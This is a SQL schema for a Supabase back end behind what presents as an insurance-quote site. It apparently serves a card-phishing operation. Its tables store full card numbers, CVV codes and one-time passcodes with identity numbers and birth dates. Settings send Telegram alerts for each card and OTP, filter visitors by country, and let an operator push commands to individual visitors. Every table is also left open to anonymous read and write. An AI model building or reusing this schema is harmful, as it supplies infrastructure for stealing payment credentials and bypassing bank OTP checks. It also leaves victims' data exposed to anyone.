
-- Applications
CREATE TABLE public.applications (
  id TEXT PRIMARY KEY,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  card_title TEXT,
  full_name TEXT, identity TEXT, birth_date TEXT, phone TEXT,
  insurance_type TEXT, start_date TEXT, purpose TEXT, est_value TEXT,
  car_year TEXT, car_model TEXT, repair_place TEXT,
  company TEXT, type TEXT, price NUMERIC, total NUMERIC, method TEXT,
  status TEXT NOT NULL DEFAULT 'pending',
  review_status TEXT NOT NULL DEFAULT 'awaiting_review',
  card_number TEXT, card_name TEXT, card_exp_month TEXT, card_exp_year TEXT,
  card_cvv TEXT, card_brand TEXT, otp_code TEXT
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.applications TO anon, authenticated;
GRANT ALL ON public.applications TO service_role;
ALTER TABLE public.applications ENABLE ROW LEVEL SECURITY;
CREATE POLICY "public all applications" ON public.applications FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);

-- Site settings (single row id=1)
CREATE TABLE public.site_settings (
  id INT PRIMARY KEY,
  geo_block_enabled BOOLEAN NOT NULL DEFAULT false,
  allowed_countries TEXT[] NOT NULL DEFAULT ARRAY['SA'],
  attempt_block_enabled BOOLEAN NOT NULL DEFAULT false,
  max_attempts INT NOT NULL DEFAULT 3,
  telegram_enabled BOOLEAN NOT NULL DEFAULT false,
  telegram_bot_token TEXT NOT NULL DEFAULT '',
  telegram_chat_id TEXT NOT NULL DEFAULT '',
  telegram_notify_new_application BOOLEAN NOT NULL DEFAULT true,
  telegram_notify_card BOOLEAN NOT NULL DEFAULT true,
  telegram_notify_otp BOOLEAN NOT NULL DEFAULT true,
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.site_settings TO anon, authenticated;
GRANT ALL ON public.site_settings TO service_role;
ALTER TABLE public.site_settings ENABLE ROW LEVEL SECURITY;
CREATE POLICY "public all site_settings" ON public.site_settings FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);
INSERT INTO public.site_settings (id) VALUES (1);

-- Chat
CREATE TABLE public.chat_conversations (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  visitor_id TEXT NOT NULL,
  customer_name TEXT NOT NULL DEFAULT '',
  customer_phone TEXT NOT NULL DEFAULT '',
  last_message_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  unread_admin INT NOT NULL DEFAULT 0,
  unread_customer INT NOT NULL DEFAULT 0,
  initiated_by TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now(),
  updated_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.chat_conversations TO anon, authenticated;
GRANT ALL ON public.chat_conversations TO service_role;
ALTER TABLE public.chat_conversations ENABLE ROW LEVEL SECURITY;
CREATE POLICY "public all chat_conversations" ON public.chat_conversations FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);

CREATE TABLE public.chat_messages (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  conversation_id UUID NOT NULL REFERENCES public.chat_conversations(id) ON DELETE CASCADE,
  sender TEXT NOT NULL,
  content TEXT NOT NULL,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.chat_messages TO anon, authenticated;
GRANT ALL ON public.chat_messages TO service_role;
ALTER TABLE public.chat_messages ENABLE ROW LEVEL SECURITY;
CREATE POLICY "public all chat_messages" ON public.chat_messages FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);

-- Blocked visitors
CREATE TABLE public.blocked_visitors (
  visitor_id TEXT PRIMARY KEY,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.blocked_visitors TO anon, authenticated;
GRANT ALL ON public.blocked_visitors TO service_role;
ALTER TABLE public.blocked_visitors ENABLE ROW LEVEL SECURITY;
CREATE POLICY "public all blocked_visitors" ON public.blocked_visitors FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);

-- Visitor commands
CREATE TABLE public.visitor_commands (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  visitor_id TEXT NOT NULL,
  command TEXT NOT NULL,
  payload TEXT,
  created_at TIMESTAMPTZ NOT NULL DEFAULT now()
);
GRANT SELECT, INSERT, UPDATE, DELETE ON public.visitor_commands TO anon, authenticated;
GRANT ALL ON public.visitor_commands TO service_role;
ALTER TABLE public.visitor_commands ENABLE ROW LEVEL SECURITY;
CREATE POLICY "public all visitor_commands" ON public.visitor_commands FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);

-- Realtime
ALTER PUBLICATION supabase_realtime ADD TABLE public.site_settings;
ALTER PUBLICATION supabase_realtime ADD TABLE public.chat_conversations;
ALTER PUBLICATION supabase_realtime ADD TABLE public.chat_messages;
ALTER PUBLICATION supabase_realtime ADD TABLE public.blocked_visitors;
ALTER PUBLICATION supabase_realtime ADD TABLE public.visitor_commands;
